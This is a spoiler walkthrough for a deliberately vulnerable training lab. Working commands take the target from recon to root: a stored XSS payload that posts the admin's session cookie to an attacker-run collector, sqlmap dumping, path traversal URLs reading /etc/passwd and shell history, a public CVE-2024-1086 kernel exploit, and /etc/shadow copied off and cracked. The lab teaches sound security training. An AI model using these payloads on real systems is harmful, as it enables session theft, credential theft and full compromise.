# Full walkthrough

> **Full spoilers.** This is the complete intended solution. If you want to attempt it yourself, use [hints.md](hints.md) instead.

Example addresses used below — the VMs get their IPs from DHCP, so yours will differ. Discover them in [Stage 0](#stage-0--recon) and substitute throughout.

| Host | IP (example) |
|------|----|
| `debian_vm` (target) | `192.168.56.10` |
| `kali_vm` (attacker) | `192.168.56.20` |

The chain in one line:

> **nmap recon** → **stored XSS** → steal admin cookie → **SQL injection** → dump + crack creds → **password reuse** → **path traversal** → leak `bob`'s password → **SSH** → **CVE-2024-1086** → root → **crack `/etc/shadow`** → `frank`.

Each link is necessary — the lab is built so you can't skip ahead (the dead ends are noted as you go).

---

## Stage 0 — Recon

### Find the target

The VMs share a network but get their addresses from DHCP, so the target's IP isn't fixed — finding it is part of the exercise, exactly as it would be on a real engagement where you only know a subnet. From the Kali box, learn your own subnet, then sweep it for live hosts:

```bash
ip -4 addr                   # note kali's address and mask, e.g. 192.168.56.21/24
nmap -sn 192.168.56.0/24     # ping sweep — the target is the other host that answers
```

> **Shortcut.** Both VMs are yours and managed by Vagrant, so you can skip the sweep and ask the host directly (run on your host, not inside Kali):
> ```bash
> vagrant ssh debian_vm -c "hostname -I"
> ```
> (`vagrant ssh-config debian_vm` also shows it). Use that address as the target below.

### Scan the target

```bash
nmap -sV -p- 192.168.56.10
```

Expected result: three doors.

```
22/tcp    open  ssh      OpenSSH ...
5001/tcp  open  http     (Werkzeug/Flask)   — Vulnera News Feed
7002/tcp  open  http     (Werkzeug/Flask)   — Vulnera File Browser
```

Browse both:

- `http://192.168.56.10:5001` — **News Feed**. Has `/register`, `/login`, a feed, and (for admins only) create/edit/delete.
- `http://192.168.56.10:7002` — **File Browser**. Login-gated; claims to be "internal use only."

Start with the News Feed because it is the only app you can get a foothold on without a password (it has self-registration).

---

## Stage 1 — News Feed: steal an admin session (stored XSS)

### 1a. The two bugs that make this work

**Bug — the XSS "sanitizer" is a one-item blacklist.** [`challenges/news-feed/app.py:43`](../challenges/news-feed/app.py#L43)

```python
def sanitize_body(content):
    sanitized = content.replace("<script>", "")
    sanitized = sanitized.replace("</script>", "")
    return sanitized
```

It strips only the literal strings `<script>` and `</script>`. Any other way of executing JavaScript sails through — and the template renders the body with `| safe`, disabling Jinja's auto-escaping entirely: [`templates/index.html:63`](../challenges/news-feed/templates/index.html#L63) → `<p>{{ post['body'] | safe }}</p>`.

**Bug — the session cookie is readable from JavaScript.** [`challenges/news-feed/app.py:11`](../challenges/news-feed/app.py#L11)

```python
app.config['SESSION_COOKIE_HTTPONLY'] = False  # TODO: Remove this workaround
```

So `document.cookie` includes the Flask `session` cookie, and our injected JS can read and exfiltrate it.

> **Why we can't just forge the cookie:** `SECRET_KEY = os.urandom(24)` ([app.py:9](../challenges/news-feed/app.py#L9)) is random per process, so the signed cookie can't be reconstructed offline. We must *steal* a live one.

### 1b. Who executes our payload

In a real deployment this would be a human admin who logs in and reads the news feed during their day. The lab has no live person, so the `admin_simulator` service stands in for one: it drives a real browser (headless Chromium) that signs in as the admin **`charlie`** and revisits the feed periodically, exactly as a real admin would — see [`helpers/admin_simulator.py`](../challenges/news-feed/helpers/admin_simulator.py). It is not a service account or an automation hook you could attack directly; it is just a way to simulate the victim's normal behaviour. When charlie views the feed, our stored post runs in their authenticated browser, so we capture charlie's admin cookie.

### 1c. Stand up the collector (on Kali)

A ready-made listener is in [`solution/xss-exploit/`](../solution/xss-exploit). It accepts a POST and prints the JSON body:

```bash
cd solution/xss-exploit
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
flask --app app run --host=0.0.0.0 --port=4000
```

(Kali/Debian mark the system Python externally-managed, so the venv avoids a `pip` refusal.)

It enables CORS, so the cross-origin `fetch` from the victim's page is allowed.

### 1d. Register, log in, and post the payload

Register any user at `http://192.168.56.10:5001/register` and log in — an ordinary, non-admin account.

The **Post News** button is hidden for non-admins, so it looks like you can't post. That's UI only: the route behind it, `/news/create`, is `@login_required` but **not** admin-gated (see [vuln #2](vulnerabilities.md)), so any logged-in user can reach it by guessing the path. Browse straight to it:

```
http://192.168.56.10:5001/news/create
```

Submit a post whose **body** is an XSS payload. Because `<script>` is filtered, use an `onerror` handler instead — point it at *your* collector (`192.168.56.20:4000`), not `localhost`:

```html
<img src=x onerror="fetch('http://192.168.56.20:4000',{method:'POST',body:JSON.stringify({cookie:document.cookie}),headers:{'Content-type':'application/json'}})">
```

(This is the same request as the bundled [`xss-script.js`](../solution/xss-exploit/xss-script.js), with the URL changed to the attacker IP.)

### 1e. Collect the cookie

Within ~60s the bot reloads the feed and your collector logs something like:

```
Received data: {'cookie': 'session=eyJpc19hZG1pbiI6MSwidXNlcl9pZCI6NiwidXNlcm5hbWUiOiJjaGFybGllIn0.Z-CvUw.1NAc...'}
```

Decode the first segment to confirm what you grabbed:

```bash
echo 'eyJpc19hZG1pbiI6MSwidXNlcl9pZCI6NiwidXNlcm5hbWUiOiJjaGFybGllIn0' | base64 -d
# {"is_admin":1,"user_id":6,"username":"charlie"}
```

Import that `session` cookie into your browser (DevTools → Application → Cookies) and reload `/news`. You now see **Edit/Delete** — you're admin.

---

## Stage 2 — News Feed: dump and crack the user table (SQL injection)

### 2a. The bug

The admin-only edit and delete routes build SQL with an f-string, injecting the URL parameter directly: [`challenges/news-feed/app.py:189`](../challenges/news-feed/app.py#L189)

```python
query = f"""
    SELECT p.id, title, body, created, user_id, username
    FROM posts p JOIN users u ON p.user_id = u.id
    WHERE p.id = {news_id}
"""
```

(`delete_news` at [app.py:232](../challenges/news-feed/app.py#L232) is injectable too, but it's destructive — use `edit_news` for extraction.) Note the contrast: `login`/`register` use parameterised queries correctly; only these admin routes regressed to string formatting. That's why **Stage 1 is a prerequisite** — `@admin_required` gates the vulnerable endpoint.

### 2b. Exploit with sqlmap

Use the stolen admin cookie:

```bash
sqlmap -u "http://192.168.56.10:5001/news/edit/1" \
       --cookie="session=eyJpc19hZG1pbiI6MSwidXNlcl9pZCI6NiwidXNlcm5hbWUiOiJjaGFybGllIn0.Z-CvUw.1NAc..." \
       -T users --dump
```

The `users` table hashes are unsalted **MD5** (the app hashes with bare `md5()` at [app.py:38](../challenges/news-feed/app.py#L38)). sqlmap recognises the hash format and offers to crack it with its built-in dictionary — accept the prompt and the common passwords fall instantly, no separate John/hashcat step needed. The one that matters is **`admin`**:

```
2251770cd912f585f675d34532c8a1f5  ->  *M0nK3y*
```

> **Dead ends to notice (intentional):**
> - `charlie` and `eve` are also admins, but their passwords are random and won't crack — which is exactly why Stage 1 had to *steal* a cookie rather than crack a password.
> - There's an app user `bob` with password `qwerty`. That is **not** the system `bob`'s password — a decoy. Don't waste it on SSH.

The real prize is that `admin` / `*M0nK3y*` is **reused** on the other app.

---

## Stage 3 — File Browser: path traversal to read `bob`'s secrets

### 3a. Log in with the reused password

The file browser hashes with scrypt ([schema.sql](../challenges/file-browser/schema.sql)) — strong, not crackable. But its `admin` password is the same `*M0nK3y*` you just cracked:

```
http://192.168.56.10:7002/login   →   admin / *M0nK3y*
```

Password reuse defeats the strong hashing entirely. (Lesson for the ADR: the weakest credential store sets the security of every system that shares a password with it.)

### 3b. The bug

[`challenges/file-browser/app.py:57`](../challenges/file-browser/app.py#L57)

```python
def is_safe_path(path):
    return path.startswith(BASE_DIR) or os.path.abspath(path).startswith(BASE_DIR)
```

`BASE_DIR` is `/var/www/file-browser/files`. The **first clause checks the raw, un-normalised string**: any path that textually *starts with* `BASE_DIR` is accepted — even if it then climbs back out with `../`. The subsequent `open()`/`send_file()` resolve the `../` for real.

### 3c. Climb out

Browse (or hit `/view?file=` directly) with a path that begins with the allowed directory and then escapes:

```
http://192.168.56.10:7002/view?file=/var/www/file-browser/files/../../../../etc/passwd
```

`/etc/passwd` confirms the users (`bob`, `frank`). The service runs as `bob`, so you can read anything bob can — including his shell history:

```
http://192.168.56.10:7002/view?file=/var/www/file-browser/files/../../../../home/bob/.bash_history
```

`/download?file=...` works the same way for binary pulls (same broken check, via `send_file`).

> You **cannot** read `/etc/shadow` here — bob can't read it either. That's why `frank` still requires on-box privilege escalation later.

### 3d. Read the leaked password

In [`setup/bash_history`](../setup/bash_history):

```bash
sudo apt update
sduo -s
letmein
```

`sduo -s` is a typo for `sudo -s`; the shell errors, and the next line — `letmein` — is bob typing what he thought was the sudo password prompt straight into the terminal. **`bob`'s system password is `letmein`.** (The history also leaks service layout, ports, and paths — useful corroboration.)

---

## Stage 4 — Foothold over SSH

```bash
ssh bob@192.168.56.10
# password: letmein
```

You now have an interactive shell as the unprivileged service user `bob`.

---

## Stage 5 — Privilege escalation to root (CVE-2024-1086)

`bob` is **not** in the `sudo` group (only `frank` is — [provision.sh:3](../setup/provision.sh#L3)), and `frank`'s hash is in root-only `/etc/shadow`. So we need a sudo-independent local root.

The target is Debian **12.4.0**, whose kernel is vulnerable to **CVE-2024-1086** — a use-after-free in netfilter `nf_tables` that yields local root. Notselwyn's public PoC:

- https://github.com/Notselwyn/CVE-2024-1086

You don't need to compile it — Notselwyn publishes prebuilt exploit binaries on the project's **Releases** page:

- https://github.com/Notselwyn/CVE-2024-1086/releases

Grab the matching release binary and run it on the target as `bob`, following the project's own README. On a vulnerable kernel it returns a root shell:

```bash
whoami
# root
```

> If the target has no internet, download the release binary on Kali and copy it over with `scp`.

> ⚠️ Kernel exploits are inherently unstable. On rare occasions the PoC can crash or hang the VM. If that happens, reset and start over — `vagrant reload debian_vm` (or `vagrant destroy debian_vm && vagrant up debian_vm` for a clean slate).

---

## Stage 6 — Crack `frank`'s password (the goal)

Now that you're root you can finally read `/etc/shadow`, where frank's `$6$` (sha512crypt) hash lives. Do the actual cracking on **Kali**, which already ships `unshadow`, John, and the `rockyou.txt` wordlist — no need to install anything on the target.

**On the target (as root)** — copy the two files off the box. Either `scp` them to Kali:

```bash
scp /etc/passwd /etc/shadow vagrant@192.168.56.20:/tmp/
```

or just `cat /etc/passwd` and `cat /etc/shadow` and paste each into a matching file on Kali.

**On Kali** — rockyou ships gzipped, so decompress it once first, then merge the two files with `unshadow` and crack:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz   # first time only
unshadow /tmp/passwd /tmp/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

John prints the cracked password as it falls (re-run with `--show` later if you need to see it again).

frank's password is in `rockyou.txt`:

```
frank : trustno1
```

🎯 **Goal met.** And because `frank` is in the `sudo` group, you now also hold durable, "legitimate" root — cleaner than the kernel exploit and the state a real attacker would pivot to.

---

## The chain, reviewed

| # | Weakness | Alone it looks like… | In the chain it became… |
|---|----------|----------------------|-------------------------|
| 1 | Blacklist XSS filter + `\| safe` | "we strip `<script>`" | admin session theft |
| 2 | Hidden button, open route | "normal users can't post" | low-priv user plants the payload |
| 3 | `HTTPONLY = False` | "a workaround" | cookie readable by the payload |
| 4 | f-string in SQL | "it's just an id" | full `users` dump |
| 5 | MD5, unsalted | "it's hashed" | instant credential crack |
| 6 | Password reuse | "same admin everywhere" | lateral move to app #2 |
| 7 | `startswith` path check | "it's restricted" | arbitrary file read |
| 8 | Secret typed into history | "harmless typo" | SSH foothold |
| 9 | Unpatched kernel | "we'll patch later" | local root |

No single bug is exotic. The compromise is the **sum**.

See [vulnerabilities.md](vulnerabilities.md) for the fix for each one.
